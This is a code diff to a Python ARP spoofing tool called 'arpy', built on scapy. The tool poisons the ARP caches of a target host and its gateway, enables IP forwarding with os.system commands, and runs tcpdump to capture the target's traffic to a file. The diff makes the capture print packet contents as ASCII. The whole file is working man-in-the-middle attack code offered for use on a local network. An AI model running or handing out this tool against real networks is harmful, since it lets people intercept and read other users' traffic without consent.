@@ -3,7 +3,7 @@ from scapy.all import *
 from getmac import get_mac_address
 import subprocess as sub
 import os, sys, threading, signal
-# Use (echo 1 > /proc/sys/net/ipv4/ip_forward) for ip forwarding
+
 LOGO = """
 
 ARP Spoofing tool made by memset-0x00
@@ -20,9 +20,7 @@ $$ |  $$ |$$ |  $$ |$$ |         $$ |
 """
 
 def help():
-    print(LOGO)
-    print("arpy [iface] [target] [gateway] [outfile]")
-    print("e.g arpy wlp4s0 192.168.1.100 192.168.1.1 out")
+    print("%s\narpy [iface] [target] [gateway] [outfile]\ne.g arpy wlp4s0 192.168.1.100 192.168.1.1 out" % LOGO)
     sys.exit(0)
 
 def restore(gateway_ip, gateway_mac, target_ip, target_mac):
@@ -33,12 +31,17 @@ def restore(gateway_ip, gateway_mac, target_ip, target_mac):
 
     send(ARP(op=2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
     send(ARP(op=2, psrc = target_ip, pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
-
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    
     try: os.kill()
 
     except: pass
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
+    # forward ipv4 traffic
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("[+] Enabled IP forwarding")
+          
     # (opcode = 2) = ARP REPLY
     poison_target = ARP()
     
@@ -89,10 +92,10 @@ def main(interf, targip, gatewy, outfile):
     # starting arp poisoning
     poison_t = threading.Thread(target = poison_target, args = (gatewy, gatewy_mac, targip, target_mac, interf))
     poison_t.start()
-
+    
     # beginning sniffing process
     try:
-        p = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-w', outfile, '--print'), stdout=sub.PIPE)
+        p = sub.Popen(('sudo', 'tcpdump', 'ip', 'host', targip, '-A','-w', outfile, '--print'), stdout=sub.PIPE)
         for row in iter(p.stdout.readline, b''): print(row.rstrip())  # iter() to make an iteration
 
     except KeyboardInterrupt:
@@ -100,10 +103,10 @@ def main(interf, targip, gatewy, outfile):
         sys.exit(0)
 
 if __name__ == "__main__":
-    # e.g arpy wlp4s0 192.168.1.179 192.168.1.1 out
+    # e.g sudo python3 arpy.py wlp4s0 192.168.1.179 192.168.1.1 out
     try:
         interface = sys.argv[1]
-        if interface == "help" or interface == "--help" or interface == "-help": help()
+        if interface.lower() == "help" or interface.lower() == "--help" or interface.lower() == "-help": help()
         target_ip = sys.argv[2]
         gatewy_ip = sys.argv[3]
         output_fl = sys.argv[4]
@@ -114,3 +117,4 @@ if __name__ == "__main__":
         else: main(interface, target_ip, gatewy_ip, output_fl)
     
     except Exception as err: print(err)
+     
